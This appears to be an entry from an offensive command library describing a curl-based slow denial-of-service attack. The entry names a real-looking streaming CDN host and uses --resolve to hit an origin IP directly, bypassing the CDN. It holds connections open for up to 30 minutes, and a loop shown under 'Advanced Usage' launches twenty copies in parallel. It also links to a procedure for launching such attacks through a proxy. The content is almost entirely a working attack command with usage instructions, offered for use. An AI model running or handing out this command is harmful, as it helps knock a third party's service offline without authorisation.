---
id: cmd-curl-slow-dos-001
data: >-
  time curl -s
  https://camo.stream.highwebmedia.com/4854b41b7c19a74ff2007dced08a28a6b67459a8/████
  --resolve camo.stream.highwebmedia.com:443:██████32 > /dev/null &
tags:
  - dos
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:48.926Z'
verified: false
validated: true
submitted: true
---
# curl-slow-dos-launch

## Command

```bash
time curl -s https://camo.stream.highwebmedia.com/4854b41b7c19a74ff2007dced08a28a6b67459a8/████ --resolve camo.stream.highwebmedia.com:443:██████32 > /dev/null &
```

## Description

Launches a background, silent curl request to a proxied slow.php endpoint, targeting a specific proxy IP to bypass CDN, for slow DoS by keeping connections open up to 30 minutes.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode, no progress meter | Yes |
| `--resolve` | Override DNS to specific host:port:IP for direct targeting | Yes |
| `> /dev/null` | Discard output to avoid clutter | Yes |
| `&` | Run in background as job | Yes |

## Examples

### Basic Usage

```bash
time curl -s https://camo.stream.highwebmedia.com/[hash]/slow --resolve camo.stream.highwebmedia.com:443:target-ip > /dev/null &
```

### Advanced Usage

Run multiple: for i in {1..20}; do time curl ... & done

## Expected Output

Pending request for up to 30 minutes; time shows long duration on completion.

## Related

- [[commands/jobs-check-pending]]
- [[procedures/Launch-Slow-and-Large-DoS-via-Proxy]]
